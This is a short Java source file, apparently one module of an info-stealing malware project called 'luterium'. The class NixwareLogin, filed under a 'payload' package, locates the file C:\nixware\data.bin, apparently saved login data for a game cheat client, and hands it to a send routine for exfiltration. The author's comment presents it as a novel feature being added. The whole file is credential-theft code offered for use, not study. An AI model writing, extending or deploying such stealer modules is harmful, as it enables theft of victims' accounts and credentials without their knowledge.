package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;

import java.io.File;
import java.util.Optional;

/**
 * @author Peter
 * @since 08/29/2022
 * I've never seen this anywhere else, so yeah, I'm adding it lol.
 */

public class NixwareLogin implements PayloadExecutor {
    Main main = new Main();

    @Override
    public void execute() throws Exception {
        Optional<File> file = FileUtil.getFile("C:\\nixware\\data.bin");

        file.ifPresent(main.theThing::send);
    }
}
